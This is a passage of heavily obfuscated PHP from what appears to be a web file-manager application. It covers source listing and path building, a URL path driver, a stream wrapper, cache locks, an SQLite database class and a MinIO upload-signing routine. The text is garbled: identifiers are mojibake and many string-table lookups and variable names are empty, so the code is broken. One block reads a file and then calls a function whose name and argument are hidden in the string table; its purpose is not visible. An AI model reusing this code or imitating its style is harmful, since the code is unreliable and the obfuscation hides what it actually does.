=> 0); if (isset($ÙÄèè[$ÔÉ±[$[191]]])) { $ÔÉ±[$[97]][$[531]] = 1; $ÔÉ±[$[97]][$[532]] = $ÙÄèè[$ÔÉ±[$[191]]][$[42]]; } if ($‚∑π && $ﬂÄ && isset($‚∑π[$ÔÉ±[$[191]]])) { $ÔÉ±[$[97]][$[533]] = array(); foreach ($‚∑π[$ÔÉ±[$[191]]] as $≈ä) { $Ìéí…ï = $ﬂÄ[$≈ä]; $ÔÉ±[$[97]][$[533]][] = array($[534] => $Ìéí…ï[$[452]], $[471] => $Ìéí…ï[$[42]], $[535] => $Ìéí…ï[$[536]]); } } if ($¬∞ && isset($¬∞[$ÔÉ±[$[191]]])) { $ÔÉ±[$[97]][$[537]] = array(); foreach ($¬∞[$ÔÉ±[$[191]]] as $) { $ = $[538]; if ($[$[539]] == $[98]) { $ .= $[540]; } $ÔÉ±[$[97]][$[537]] = array_field_key($, explode($[60], $)); } } } unset($ÔÉ±); return $; } protected function _listAppendChildren(&$‘é‹ª, $‚¨°) { $ =& $_SERVER[]; $ÂïØ = array(); $»ì∆§ = array($[233] => 0, $[234] => 0); foreach ($‘é‹ª as &$) { if (!$[$[462]]) { continue; } $ÂïØ[] = $[$[191]]; } unset($); if (!$ÂïØ) { return; } $ = array($[190] => array($[17], $ÂïØ), $[482] => 0); $Œ§ = array($[190], $[462], $[541] => $[542]); $ = $this->field($Œ§)->where($)->group($[543])->select(); $ = array(); foreach ($ as $) { $À≤ = $[$[190]]; $ = $[$[462]] == $[98] ? $[234] : $[233]; if (!isset($[$À≤])) { $[$À≤] = array($[233] => 0, $[234] => 0); } $[$À≤][$] += $[$[542]]; } foreach ($‘é‹ª as &$) { if (!$[$[462]]) { continue; } $ = is_array($[$[$[191]]]) ? $[$[$[191]]] : $»ì∆§; $[$[234]] = $[$[234]]; $[$[233]] = $[$[233]]; unset($[$[463]]); } unset($); } protected function _listAppendAuth(&$ƒÖ) { $ =& $_SERVER[]; $»¨ = array(); foreach ($ƒÖ as $) { if ($[$[188]] == self::TYPE_GROUP) { $»¨[] = $[$[191]]; } } if (!$»¨) { return; } $Õù = array_to_keyvalue($ƒÖ, $[191]); $ = Model($[544])->getSourceList($»¨, $Õù); $ = $GLOBALS[$[545]] == 1; foreach ($ƒÖ as $ÈÖí => &$) { $[$[464]] = $[$[$[191]]]; if (!$[$[464]] && $[$[188]] == self::TYPE_GROUP) { $[$[464]] = Action($[546])->pathGroupAuthMake($[$[547]]); if (!$[$[464]] && !$) { $[$[227]] = !1; $[$[226]] = !1; } } if ($[$[464]]) { $[$[227]] = AuthModel::authCheckEdit($[$[464]][$[465]]); $[$[226]] = AuthModel::authCheckView($[$[464]][$[465]]); } $this->groupPathDisplay($); } unset($); } public function _listAppendAuthSecret(&$«Ø Ñ) { $ =& $_SERVER[]; if (Model($[485])->get($[548]) != $[98]) { return; } static $≈Ü = false; if (!$≈Ü) { $‰∫± = Model($[549]); $Ãë = Model($[550]); $≈Ü = $Ãë->listData(); $≈Ü = array_to_keyvalue($≈Ü, $[191]); $ = json_decode(Model($[485])->get($[551]), !0); $ = array_to_keyvalue($, $[452]); foreach ($≈Ü as $ => $) { $ = $[$[$[552]]]; if (!$) { $Ãë->remove($[$[452]]); unset($≈Ü[$]); continue; } $◊ã€Å = $‰∫±->listData($[$[464]]); if (!$◊ã€Å) { $Ãë->remove($[$[452]]); unset($≈Ü[$]); continue; } $[$[464]] = $◊ã€Å; $[$[553]] = $; $[$[554]] = Model($[555])->getInfoSimpleOuter($[$[504]]); $≈Ü[$] = $; } } $ﬁá = USER_ID; $◊¥ = array(); $ = $this->_listAppendPath($◊¥, !0); foreach ($«Ø Ñ as $ => &$) { if (!is_array($[$[464]])) { continue; } if ($[$[188]] != $[556]) { continue; } if (isset($≈Ü[$[$[191]]])) { $⁄® = $≈Ü[$[$[191]]]; if (!is_array($[$[516]])) { $[$[516]] = array(); } $[$[516]][$[557]] = $⁄®[$[552]]; $[$[464]][$[558]] = $⁄®; $[$[464]][$[559]] = $[$[560]]; $[$[464]][$[561]] = $[98]; if ($⁄®[$[504]] != $ﬁá) { $[$[464]][$[465]] = $[$[464]][$[465]] & $⁄®[$[464]][$[464]]; } continue; } $Õö = $this->parentLevelArray($[$[562]]); $ = array_reverse($Õö); foreach ($ as $ => $’ú√±) { if (!isset($≈Ü[$’ú√±])) { continue; } $⁄® = $≈Ü[$’ú√±]; $[$[464]][$[558]] = $⁄®; if ($⁄®[$[504]] != $ﬁá) { $[$[464]][$[465]] = $[$[464]][$[465]] & $⁄®[$[464]][$[464]]; } $ = $[22]; $◊¶ = count($Õö) - $; for ($ƒö = 0; $ƒö < $◊¶; $ƒö++) { if (!isset($[$Õö[$ƒö]])) { $ = $[22]; break; } $ = $ . rtrim($[$Õö[$ƒö]], $[18]) . $[18]; } $[$[464]][$[559]] = rtrim($, $[18]) . $[18]; break; } } unset($); } public function groupPathDisplay(&$Ìè∏) { $›í =& $_SERVER[]; if ($Ìè∏[$›í[188]] != self::TYPE_GROUP) { return; } $ÕÅ = Model($›í[563])->getInfo($Ìè∏[$›í[547]]); $—ó = $this->parentLevelArray($ÕÅ[$›í[562]]); $ = $›í[22]; foreach ($—ó as $›∫) { $‘ö = Model($›í[563])->getInfo($›∫); $ .= $‘ö[$›í[97]][$›í[191]] . $›í[60]; } $Ìè∏[$›í[564]] = $ÕÅ[$›í[190]]; $Ìè∏[$›í[565]] = $ÕÅ[$›í[562]]; $Ìè∏[$›í[566]] = $ÕÅ[$›í[567]]; $Ìè∏[$›í[568]] = $ . $ÕÅ[$›í[97]][$›í[191]]; } protected function _listAppendPath(&$, $”∞÷Å = false) { $»û =& $_SERVER[]; static $ = array(); $ﬂ£ﬁæ‹ç = array(); $ƒù = array(); if ($”∞÷Å) { return $; } foreach ($ as &$◊èƒõ) { $Ãñ = $◊èƒõ[$»û[191]]; if ($◊èƒõ[$»û[462]] == $»û[98] && $◊èƒõ[$»û[190]] != 0) { $[$Ãñ] = $◊èƒõ[$»û[42]]; } if ($◊èƒõ[$»û[462]] == $»û[98] && $◊èƒõ[$»û[190]] == 0) { $[$Ãñ] = $this->_listAppendPathRoot($◊èƒõ, array()); } if (isset($ƒù[$◊èƒõ[$»û[562]]])) { continue; } $ƒù[$◊èƒõ[$»û[562]]] = !0; $¬º = $this->parentLevelArray($◊èƒõ[$»û[562]]); foreach ($¬º as $œá => $‚êõ) { if (isset($[$‚êõ])) { continue; } if ($œá == 0) { $[$‚êõ] = $this->_listAppendPathRoot($◊èƒõ, $¬º); } if ($œá != 0) { $ﬂ£ﬁæ‹ç[] = $‚êõ; } } } unset($◊èƒõ); $ﬂ£ﬁæ‹ç = array_unique($ﬂ£ﬁæ‹ç); if (count($ﬂ£ﬁæ‹ç) > 0) { $ = array($»û[468] => array($»û[469], $ﬂ£ﬁæ‹ç)); if (count($ﬂ£ﬁæ‹ç) == 1) { $ ∞ = $this->sourceInfo($ﬂ£ﬁæ‹ç[0]); $ = is_array($ ∞) ? array($ ∞) : !1; } else { $ = $this->field($»û[569])->where($)->select(); } if (!$) { $ = array(); } foreach ($ as $) { $[$[$»û[191]]] = $[$»û[42]]; } } $◊î = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ = array(); foreach ($ as &$◊èƒõ) { $·®Ä = $◊èƒõ[$»û[562]]; $√í = $»û[22]; if (isset($[$·®Ä])) { $√í = $[$·®Ä]; } else { $¬º = $this->parentLevelArray($◊èƒõ[$»û[562]]); foreach ($¬º as $œá => $‚êõ) { if (isset($[$‚êõ])) { $√í .= $[$‚êõ] . $»û[18]; } } $[$·®Ä] = $√í; } $√í .= $◊èƒõ[$»û[42]]; if ($◊èƒõ[$»û[462]] == $»û[98]) { $√í .= $»û[18]; } $◊èƒõ[$»û[560]] = str_replace($»û[570], $»û[18], $√í); if ($◊èƒõ[$»û[190]] == $»û[222]) { $◊èƒõ[$»û[42]] = trim($[$◊èƒõ[$»û[191]]], $»û[18]); $◊èƒõ[$»û[560]] = $◊èƒõ[$»û[42]] . $»û[18]; } if (intval($◊èƒõ[$»û[188]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($◊èƒõ, $¬º, $◊î); } } unset($◊èƒõ); return $; } private function _listAppendPathRecycle(&$, $œ¶, $) { $ =& $_SERVER[]; if (!in_array($, $œ¶) && $[$[191]] != $) { return; } $ = explode($[18], trim($[$[560]], $[18])); $ = implode($[18], array_slice($, 2)); $[$[560]] = $[18] . LNG($[571]) . $[18] . ltrim($, $[18]); $[$[562]] = $[572] . implode($[60], array_slice($œ¶, 1)) . $[60]; if ($[$[191]] == $) { $[$[562]] = $[572]; $[$[190]] = $[222]; $[$[42]] = LNG($[571]); } $[$[573]] = $[574]; } protected function _listAppendPathRoot(&$, $„ìß) { $œ∂ =& $_SERVER[]; static $Œ™ = false; $€æ = $œ∂[22]; if ($[$œ∂[188]] == self::TYPE_USER) { if ($[$œ∂[547]] == USER_ID) { $€æ = LNG($œ∂[575]); if ($Œ™ === !1) { $ = Model($œ∂[576])->getInfoFull(USER_ID); $Œ™ = _get($, $œ∂[577], $œ∂[22]); } if ($„ìß && $„ìß[0] == $Œ™ || !$„ìß && $[$œ∂[191]] == $Œ™) { $€æ = LNG($œ∂[578]); $[$œ∂[579]] = $œ∂[580]; } if (!$„ìß) { $[$œ∂[42]] = $€æ; } } else { $[$œ∂[581]] = Model($œ∂[555])->getInfoSimpleOuter($[$œ∂[547]]); $€æ = LNG($œ∂[582]) . $œ∂[173] . $[$œ∂[581]][$œ∂[42]] . $œ∂[175]; } } else { if ($[$œ∂[188]] == self::TYPE_GROUP) { $›Ø = Model($œ∂[563])->getInfoSimple($[$œ∂[547]]); $€æ = $›Ø[$œ∂[42]]; } else { if ($[$œ∂[188]] == self::TYPE_SYSTEM) { $€æ = $œ∂[583]; } } } $€æ = $€æ ? $œ∂[18] . $€æ . $œ∂[18] : $œ∂[18]; return $€æ; } protected function _listAppendUser(&$‹•) { $ =& $_SERVER[]; $ = array_to_keyvalue($‹•, $[22], $[504]); $÷ù = array_to_keyvalue($‹•, $[22], $[506]); $ƒà = array_merge($, $÷ù); $Œ∏ = Model($[576])->userListInfo($ƒà); foreach ($‹• as &$Óì¨) { $⁄ú = $Óì¨[$[504]]; $Óì¨[$[504]] = $Œ∏[$⁄ú] ? $Œ∏[$⁄ú] : !1; $⁄ú = $Óì¨[$[506]]; $Óì¨[$[506]] = $Œ∏[$⁄ú] ? $Œ∏[$⁄ú] : !1; if (isset($Óì¨[$[516]]) && $Óì¨[$[516]][$[584]]) { $ﬂò = $GLOBALS[$[16]][$[99]][$[585]]; if ($Óì¨[$[516]][$[586]] <= time() - $ﬂò) { $this->metaSet($Óì¨[$[191]], $[584], null); $this->metaSet($Óì¨[$[191]], $[586], null); unset($Óì¨[$[516]][$[584]]); continue; } $ = $Óì¨[$[516]][$[584]]; $Óì¨[$[516]][$[587]] = Model($[576])->getInfoSimpleOuter($); } } unset($Óì¨); } public function parentLevelArray($ÿΩ) { $Ïâì =& $_SERVER[]; $ÿΩ = explode($Ïâì[60], trim($ÿΩ, $Ïâì[60])); return array_remove_value($ÿΩ, $Ïâì[222]); } public function listAll($‘≠) { $ =& $_SERVER[]; $ = $this->sourceInfo($‘≠); $≈õ = array($[588] => array($[589], $[$[562]] . $‘≠ . $[590]), $[591] => 0); $ = $[592]; $ = "\x4c\x45\106\124\40\x4a\117\111\x4e\40{$this->tablePrefix}\151\x6f\137\146\x69\154\x65\40\146\151\154\x65\x20\157\156\40\163\157\x75\x72\143\x65\x2e\x66\x69\154\145\x49\104\40\x3d\40\x66\x69\x6c\x65\x2e\146\x69\154\x65\x49\x44"; $ = $this->alias($[496])->field($)->where($≈õ)->join($)->select(); $this->_listAppendAuth($); $this->_listAppendUser($); $this->_listAppendPath($); $ = array_to_keyvalue($, $[191]); $ÎºÅ = "\57{$[$[42]]}\57"; $ÎºÅ = $ÎºÅ == $[570] ? $[18] : $ÎºÅ; $ÈÆ† = array(); foreach ($ as $€∂ => $) { $…é = $this->parentLevelArray($[$[562]]); array_shift($…é); $›áÎÑ´ = $ÎºÅ; for ($ = 0; $ < count($…é); $++) { $›áÎÑ´ .= $[$…é[$]][$[42]] . $[18]; } $›áÎÑ´ .= $[$[42]]; if ($[$[462]]) { $›áÎÑ´ .= $[18]; } $ = array($[472] => str_replace($[570], $[18], str_replace($[570], $[18], str_replace($[570], $[18], $›áÎÑ´))), $[593] => intval($[$[462]]), $[594] => intval($[$[86]]), $[95] => intval($[$[95]]), $[97] => $this->pathInfoFilter($)); if (!$[$[462]]) { $[$[518]] = $[$[518]]; } $ÈÆ†[] = $; } $ÈÆ† = array_sort_by($ÈÆ†, $[94]); return $ÈÆ†; } } goto Bƒä; cÍ∑ë: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($◊ºÀû = false) { } public function exist($) { $ = $this->info($); return $[$_SERVER[][226]]; } public function isFile($) { $œ° = $this->info($); return $œ°[$_SERVER[][226]]; } public function isFolder($–¶) { return !1; } public function size($–´) { $ = $this->info($–´); return $[$_SERVER[][86]]; } public function info($Ë∫®) { return $this->infoParse($Ë∫®); } public function infoAuth($) { return $this->infoParse($); } public function infoWithChildren($) { return $this->infoParse($); } public function infoFull($Œö) { return $this->infoParse($Œö); } private function infoParse($’å) { $ =& $_SERVER[]; $Ÿê = $this->header($’å); if (!$Ÿê || !$Ÿê[$[790]]) { return !1; } $ = _get($Ÿê, $[390], 0); $Õé = array($[42] => $Ÿê[$[42]], $[94] => $’å, $[43] => $[224], $[86] => intval($), $[185] => get_path_ext($Ÿê[$[42]]), $[1404] => $ > 0 && $Ÿê[$[1526]], $[1405] => !1); return $Õé; } private function header($≈µ) { $ﬁô =& $_SERVER[]; if (isset(self::$_cacheHeader[$≈µ])) { return self::$_cacheHeader[$≈µ]; } $ƒá = isset($GLOBALS[$ﬁô[1527]]) ? $GLOBALS[$ﬁô[1527]] : !1; $GLOBALS[$ﬁô[1527]] = !0; self::$_cacheHeader[$≈µ] = url_header($≈µ); $GLOBALS[$ﬁô[1527]] = $ƒá; return self::$_cacheHeader[$≈µ]; } public function hashSimple($, $ﬁà = false) { $÷§ =& $_SERVER[]; $ = $this->info($); if (!$ || !$[$÷§[226]]) { return !1; } $ = $[$÷§[86]]; $ = 200; $Ãì = 50; if ($ <= $ * $Ãì) { return md5($this->fileSubstr($, 0, $)) . $; } $ ≥ = intval($ / $Ãì); $Á∂ó = $÷§[22]; $Õã = timeFloat(); $ = 15; for ($ƒà = 0; $ƒà < $Ãì; $ƒà++) { if (timeFloat() - $Õã > $) { return !1; } $ = $this->fileSubstr($, $ ≥ * $ƒà, $); if (!$) { return !1; } $Á∂ó .= $; } $Á∂ó .= $this->fileSubstr($, $ - $, $); return md5($Á∂ó) . $; } public function getContent($) { return $this->fileSubstr($); } public function fileSubstr($‹∫, $—Æﬂú = 0, $ = -1) { $Ã° =& $_SERVER[]; $Ã§ = $this->info($‹∫); if (!$Ã§ || !$Ã§[$Ã°[226]] && $Ã§[$Ã°[86]] > 1024 * 1024 * 10) { return !1; } if ($ === -1) { $ = $Ã§[$Ã°[86]]; } if ($ == 0) { return $Ã°[22]; } $ = array($Ã°[1528] . $—Æﬂú . $Ã°[822] . ($—Æﬂú + $ - 1)); $ = url_request($‹∫, $Ã°[255], !1, $, !1, !1, 30); return $[$Ã°[1243]] ? $[$Ã°[1243]] : $Ã°[22]; } public function download($»†, $) { Downloader::start($»†, $); return $; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ ø, $Ê¢û = '') { $this->info = $this->info($ ø); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[][94]]; $this->pathOpen = $ ø; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ ø])) { self::$_chunkBuffer[$ ø] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($) { $ = $this->fileSubstr($this->pose, $); $this->pose += strlen($); return $; } public function stream_tell() { return $this->pose; } public function stream_seek($Õ∑, $◊Æﬁì) { $ÿâ =& $_SERVER[]; if ($◊Æﬁì == SEEK_SET) { $this->pose = $Õ∑; } else { if ($◊Æﬁì == SEEK_CUR) { $this->pose += $Õ∑; } else { if ($◊Æﬁì == SEEK_END) { $this->pose = $this->info[$ÿâ[86]] + intval($Õ∑); } } } if ($Õ∑ < 0) { $this->pose = $this->info[$ÿâ[86]] + $Õ∑; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[][86]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($«®, $) { $ =& $_SERVER[]; $ = $this->info($«®); return array($[1529] => 0, $[1530] => 0, $[26] => 32768 + 511, $[1531] => 0, $[1532] => 0, $[1533] => 0, $[1534] => 0, $[86] => $[$[86]], $[1535] => $[$[1403]], $[1491] => $[$[95]], $[1490] => $[$[225]], $[1536] => 0, $[1537] => 0); } static $fileInfo = array(); public function info($ÂÄÉ) { $ ≤ = $_SERVER[][1538]; if (isset(self::$fileInfo[$ÂÄÉ])) { return self::$fileInfo[$ÂÄÉ]; } if (substr($ÂÄÉ, 0, strlen($ ≤)) != $ ≤) { return !1; } self::$fileInfo[$ÂÄÉ] = IO::info(substr($ÂÄÉ, strlen($ ≤))); return self::$fileInfo[$ÂÄÉ]; } public static function read($◊†, $, $…é) { if (!isset(self::$_fopenCache[$◊†])) { $Ó£ïﬂØ = new StreamWrapperIO(); $Ó£ïﬂØ->stream_open($◊†); self::$_fopenCache[$◊†] = $Ó£ïﬂØ; } $Ó£ïﬂØ = self::$_fopenCache[$◊†]; return $Ó£ïﬂØ->fileSubstr($, $…é); } public static function _read($, $‹©, $√º) { $Âê§ =& $_SERVER[]; $ = fopen($, $Âê§[1407]); if (!$) { return $Âê§[22]; } $ ∞»´ = 8192; fseek($, $‹©, SEEK_SET); $ÔÆØ√Å = $Âê§[22]; $√Æ›° = 0; while ($√Æ›° < $√º) { $ = min($ ∞»´, $√º - $√Æ›°); $ÔÆØ√Å .= fread($, $); $√Æ›° += $; } fclose($); return $ÔÆØ√Å; } public function fileSubstr($, $) { $ =& $_SERVER[]; $”è = $this->info[$[86]]; $‹Ä = $; $ = $; if ($ < 0) { $ = $”è + $; } if ($ === !1) { $ = $”è - $; } if ($ + $ > $”è) { $ = $”è - $; } if ($ <= 0) { return $[22]; } if ($ < 0 || $ >= $”è || $ <= 0 || $ > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\x69\x6c\145\x52\145\x61\144\40\x65\162\x72\157\162\x21\40\163\x74\141\162\164\x3d{$}\73\154\x65\x6e\147\x74\x68\75{$}\73\40\x73\x69\172\x65\75{$”è}\x3b"); } $ = 64 * 1024; $–Ä =& self::$_chunkBuffer[$this->path]; if (!$–Ä) { $–Ä = array(); } $ = 0; $”à = 0; $ÒÖ≤É = $[22]; foreach ($–Ä as $ => $ÒÖ≤É) { $ = intval($); $”à = $ + strlen($ÒÖ≤É); if ($ >= $”à) { continue; } if ($ >= $ && $ + $ <= $”à) { return substr($ÒÖ≤É, $ - $, $); } break; } if (count($–Ä) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($[1539], $[1540] . count($–Ä) . "\x3b\163\x74\141\162\x74\x3d{$}\54\x6c\x65\x6e\x67\x74\x68\75{$}\73\x70\157\163\x65\72{$}\x7e{$”à}"); throw new Exception($[1541]); } $ = intval($ / $) * $; $÷∂ = ceil(($ + $) / $) * $ - $; $√Å = IO::fileSubstr($this->path, $, $÷∂); $–Ä[$ . $[22]] = $√Å; ksort($–Ä); $”ª = substr($√Å, $ - $, $); return $”ª; } private function log($¬°, $) { $√ó =& $_SERVER[]; $»∑◊µ = timeFloat() - $this->timeStart; write_log(sprintf($√ó[1542], $¬°, $this->info[$√ó[42]], $»∑◊µ, $), $√ó[1223]); } } class Message { function __construct() { } public function send($ = '', $ = array(), $ = "\164\145\170\164") { $ =& $_SERVER[]; $€¢⁄ç = array($[43] => $[1543], $[794] => $); if (in_array($, array($[1543], $[1544]))) { $€¢⁄ç[$[43]] = $; } $ = array($[556] => isset($[$[556]]) ? $[$[556]] : $[22], $[639] => isset($[$[639]]) ? $[$[639]] : $[22]); if (empty($) || empty($[$[556]]) && empty($[$[639]])) { return !1; } $ ± = array($[1484] => $€¢⁄ç, $[1545] => $); Hook::trigger($[1546], $ ±); } } goto D–∏; c⁄É: class CacheLockMemcached { public function lock($‰±Ö, $ = 0) { $ = Cache::init(); $ﬁ≤ = microtime(!0) + $; while (microtime(!0) < $ﬁ≤) { $ÕΩ = $->get($‰±Ö); if (!$ÕΩ || $ÕΩ < microtime(!0)) { $ = $->handle->add($‰±Ö, $ﬁ≤, $); if ($) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($) { return Cache::init()->get($); } public function unlock($) { return Cache::init()->remove($); } } class CacheLockDatabase { public function lock($, $≈í⁄† = 0) { $ = Model($_SERVER[][869]); $ = microtime(!0) + $≈í⁄†; while (microtime(!0) < $) { $ = $->get($); if (!$ || $ < microtime(!0)) { $ = $->set($, $); if ($) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($÷ß) { return Model($_SERVER[][869])->get($÷ß); } public function unlock($‰ùô) { Model($_SERVER[][869])->remove($‰ùô); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($”±, $) { $ =& $_SERVER[]; if (!class_exists($[907])) { show_json($[908], !1); } $this->cacheTime = $; $this->handle = new Memcached(); if (is_array($”±[$[909]]) && count($”±[$[909]]) >= 1) { foreach ($”±[$[909]] as $€æ) { $ = explode($[4], $€æ); $this->handle->addServer($[0], $[1]); } } else { $this->handle->addServer($”±[$[206]], $”±[$[207]]); } } public function set($√ó, $, $’° = false) { $’° = $’° ? $’° : $this->cacheTime; return $this->handle->set($√ó, $, $’°); } public function get($) { return $this->handle->get($); } public function remove($ÚÅæç) { return $this->handle->delete($ÚÅæç); } public function deleteAll() { return $this->handle->flush(); } } goto F„µî’ñ; Fƒ∑: if ($_SERVER[$_SERVER[][6]] != $_SERVER[$_SERVER[][7]]) { $_getc = $_SERVER[][8]; $_getfile = $_SERVER[$_SERVER[][9]] . $_SERVER[][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[][11], $_getfilec); if (count($_getarrs) < $_SERVER[][12]) { $exit = $_SERVER[][13]; $exit(); } $_act = $_SERVER[][14]; $_act($_SERVER[$_SERVER[][15]]); } class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $≈∫ =& $_SERVER[]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$≈∫[16]] =& $config; $this->values[$≈∫[17]] =& $in; $this->tpl = TEMPLATE . MOD . $≈∫[18]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($…∑) { if (1 === func_num_args()) { $this->{$…∑} = new $…∑(); } else { $ = new ReflectionClass($…∑); $»î = func_get_args(); array_shift($»î); $this->{$…∑} = $->newInstanceArgs($»î); } return $this->{$…∑}; } public function routeBind($…ù, $∆é, $Â•ö = 3) { $ =& $_SERVER[]; $”Ö = $this->in[$[19]]; $…ù = str_replace($[20], $[21], trim(trim($…ù, $[18]), $[22])); if (!$…ù || count($”Ö) <= $Â•ö) { return !1; } $Íøôƒå = !0; $ = explode($[18], $…ù); for ($≈ú = 0; $≈ú < count($); $≈ú++) { if ($[$≈ú] != $”Ö[$Â•ö + $≈ú]) { $Íøôƒå = !1; break; } } if (!$Íøôƒå) { return; } call_user_func_array(array($this, $∆é), array()); } public function routeArgs($ = 3) { $÷£ = $this->in[$_SERVER[][19]]; if (count($÷£) <= $) { return array(); } $ = array(); for ($ = $; $ < count($÷£); $ += 2) { $[$÷£[$]] = $÷£[$ + 1]; $this->in[$÷£[$]] = $÷£[$ + 1]; } return $; } protected function assign($ËåÖ, $) { $this->values[$ËåÖ] = $; } protected function display($) { ob_end_clean(); extract($this->values); require $this->tpl . $; } } class DbSqliteBase extends Db { public function __construct($’™ = '') { $ =& $_SERVER[]; if (!extension_loaded($[23])) { think_exception(think_lang($[24]) . $[25]); } if (!empty($’™)) { if (!isset($’™[$[26]])) { $’™[$[26]] = 438; } $this->config = $’™; if (empty($this->config[$[27]])) { $this->config[$[27]] = array(); } } } public function connect($ = '', $ = 0) { $ÁÖ¥ =& $_SERVER[]; if (!isset($this->linkID[$])) { if (empty($)) { $ = $this->config; } $Â¶Ñ = !empty($[$ÁÖ¥[27]][$ÁÖ¥[28]]) ? $[$ÁÖ¥[27]][$ÁÖ¥[28]] : $this->pconnect; $Ÿó = $Â¶Ñ ? $ÁÖ¥[29] : $ÁÖ¥[30]; $this->linkID[$] = $Ÿó($[$ÁÖ¥[31]], $[$ÁÖ¥[26]]); if (!$this->linkID[$]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$], 30000); if (1 != think_config($ÁÖ¥[32])) { unset($this->config); } } return $this->linkID[$]; } public function free() { $this->queryID = null; } public function query($÷º) { $⁄™ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $÷º; if ($this->queryID) { $this->free(); } think_action_status($⁄™[33], 1); think_status($⁄™[34]); $this->queryID = sqlite_query($this->_linkID, $÷º); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $»õ = $this->getAll(); return $»õ; } } public function execute($‹Æ) { $—¨ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‹Æ; if ($this->queryID) { $this->free(); } think_action_status($—¨[35], 1); think_status($—¨[34]); $ = sqlite_exec($this->_linkID, $‹Æ); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÿ¨ = sqlite_query($this->_linkID, $_SERVER[][37]); if (!$ÿ¨) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ = sqlite_query($this->_linkID, $_SERVER[][38]); if (!$) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Œ≤¬æ = array(); if ($this->numRows > 0) { for ($Êòë = 0; $Êòë < $this->numRows; $Êòë++) { $Œ≤¬æ[$Êòë] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Œ≤¬æ; } public function getFields($œÆ) { $«â =& $_SERVER[]; $ = $this->query($«â[39] . $œÆ . $«â[40]); $“Ω = array(); if ($) { foreach ($ as $ => $‘ó) { $“Ω[$‘ó[$«â[41]]] = array($«â[42] => $‘ó[$«â[41]], $«â[43] => $‘ó[$«â[44]], $«â[45] => (bool) ($‘ó[$«â[46]] === $«â[22]), $«â[47] => $‘ó[$«â[48]], $«â[49] => strtolower($‘ó[$«â[50]]) == $«â[51], $«â[52] => strtolower($‘ó[$«â[53]]) == $«â[54]); } } return $“Ω; } public function getTables($ = '') { $ =& $_SERVER[]; $ = $this->query($[55] . $[56] . $[57]); $Õö≈µ = array(); foreach ($ as $ŸÇ => $) { $Õö≈µ[$ŸÇ] = current($); } return $Õö≈µ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $⁄Ç =& $_SERVER[]; $‘ü = sqlite_last_error($this->_linkID); $this->error = $‘ü . $⁄Ç[4] . sqlite_error_string($‘ü); if ($⁄Ç[22] != $this->queryStr) { $this->error .= LNG($⁄Ç[58]) . $this->queryStr; } think_trace($this->error, $⁄Ç[22], $⁄Ç[59]); return $this->error; } public function escapeString($) { return sqlite_escape_string($); } public function parseLimit($) { $”¢ =& $_SERVER[]; $ = $”¢[22]; if (!empty($)) { $ = explode($”¢[60], $); if (count($) > 1) { $ .= $”¢[61] . $[1] . $”¢[62] . $[0] . $”¢[63]; } else { $ .= $”¢[61] . $[0] . $”¢[63]; } } return $; } } goto BÛ±ëß; E¬Ö: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($—Ö) { parent::__construct($—Ö); $this->signatureVersion($_SERVER[][241]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($ÔÖç, $⁄Ä = 3600) { $ =& $_SERVER[]; $›ø = $[223]; $ = $[262]; $ = $[72]; $ = gmdate($[263]); $ = gmdate($[264]); $ = $[265]; $À£ = $⁄Ä . $[22]; $œ∫ = $[266]; $÷Ç = array($this->accessKey, $, $this->region, $, $); $“ç = implode($[18], $÷Ç); $ = array($[267] => gmdate($[268], strtotime($[269])), $[270] => array(array($[271] => $this->bucket), array($[272] => $›ø), array($[273], $[274], $[22]), array($[273], $[275], $[22]), array($[273], $[276], $[22]), array($[277] => $œ∫), array($[278] => $“ç), array($[279] => $), array($[280] => $), array($[281] => $À£))); $ = base64_encode(json_encode($)); $ = hash_hmac($[282], $, $[283] . $this->secret, !0); $ = hash_hmac($[282], $this->region, $, !0); $ƒ¢Œò = hash_hmac($[282], $, $, !0); $„ß´ = hash_hmac($[282], $, $ƒ¢Œò, !0); $ = hash_hmac($[282], $, $„ß´); $ = array($[240] => $[22], $[284] => $[22], $[272] => $›ø, $[277] => $œ∫, $[285] => $, $[286] => $“ç, $[287] => $, $[288] => 